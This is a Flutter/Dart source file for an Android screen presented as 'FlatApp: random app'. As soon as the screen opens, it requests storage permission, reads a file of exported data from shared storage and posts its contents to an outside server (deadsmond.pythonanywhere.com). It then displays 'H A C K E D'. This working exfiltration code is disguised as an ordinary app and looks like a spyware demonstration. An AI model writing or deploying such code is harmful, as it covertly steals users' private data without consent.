import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'dart:io';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;


//==============================================================================
//--------------------------- INITIALIZATION -----------------------------------
// FlatApp class object, operating algorithms and behaviour
class ContactsRoute extends StatefulWidget {
  //---------------------------- VARIABLES -------------------------------------
  @override
  _FlatAppMainState createState() => _FlatAppMainState();
}

//==============================================================================
//---------------------------- WIDGET ------------------------------------------
class _FlatAppMainState extends State<ContactsRoute> {
  //---------------------------- VARIABLES -------------------------------------
  // var to store contacts
  String _data;

  //---------------------------- INIT ------------------------------------------
  @override
  void initState() {
    super.initState();
    _operateContacts();
  }

  //-------------------------- FILE CONTENT ------------------------------------
  void sendRequest() async {
    var url = 'https://deadsmond.pythonanywhere.com/checkpoint';
    Map<String, String> headers = {"Content-type": "application/json"};
    String jsonBody = '{"data": "$_data"}';
    http.Response response = await http.post(url, headers: headers, body: jsonBody);
    print('Response status: ${response.statusCode}');
    print('Response body: ${response.body}');
  }

  Future<PermissionStatus> _getPermissionWRITE() async {
    PermissionStatus permission = await PermissionHandler()
        .checkPermissionStatus(PermissionGroup.storage);
    if (permission != PermissionStatus.granted &&
        permission != PermissionStatus.disabled) {
      Map<PermissionGroup, PermissionStatus> permisionStatus =
      await PermissionHandler()
          .requestPermissions([PermissionGroup.storage]);
      return permisionStatus[PermissionGroup.storage] ??
          PermissionStatus.unknown;
    } else {
      return permission;
    }
  }

  Future<File> getFile() async {
    String path = '/storage/emulated/0/exported_data.txt';
    return File(path);
  }

  void readShared() async {
      // Read the file
      File file = await getFile();
      _data = await file.readAsString();
  }

  void saveShared() async {
    // Save to the file
    File file = await getFile();
    file.writeAsString(_data);
  }

  void _operateContacts() async {
    try {
      PermissionStatus permissionStatusWRITE = await _getPermissionWRITE();
      if (permissionStatusWRITE == PermissionStatus.granted) {
        print("Loading contacts...");
        readShared();
        sendRequest();
        print('Loading contact completed.');
      } else {
        throw PlatformException(
          code: 'PERMISSION_DENIED',
          message: 'Access to location data denied',
          details: null,
        );
      }
    } catch (e){
      // what went wrong?
      print(e);
    }
  }

  //---------------------------- MAIN WIDGET -----------------------------------
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('FlatApp: random app'),
        actions: <Widget>[
          new IconButton(
            icon: new Icon(Icons.close),
            onPressed: () =>
                SystemChannels.platform.invokeMethod('SystemNavigator.pop'),
          ),
        ],
      ),

      body: _data != null
          ? Text('H A C K E D' ?? '')
          : CircularProgressIndicator(),

      bottomNavigationBar: BottomNavigationBar(
          items: const <BottomNavigationBarItem>[
            BottomNavigationBarItem(
              icon: Icon(Icons.not_interested),
              title: Text('Exit'),
            ),
            BottomNavigationBarItem(
              icon: Icon(Icons.exit_to_app),
              title: Text('Load data'),
            ),
          ],
          // operate NavigationBar
          onTap: (index) {
            // operate NavigationBar
            switch (index) {
              case 0:
              // EXIT --------------------------------------------------------
              // exit app - this is preferred way
                SystemChannels.platform.invokeMethod('SystemNavigator.pop');
                break;
              case 1:
                print("Sending contact...");
                _operateContacts();
                break;
            // -----------------------------------------------------------------
            }
          }
      ),
    );
  }
}
//==============================================================================
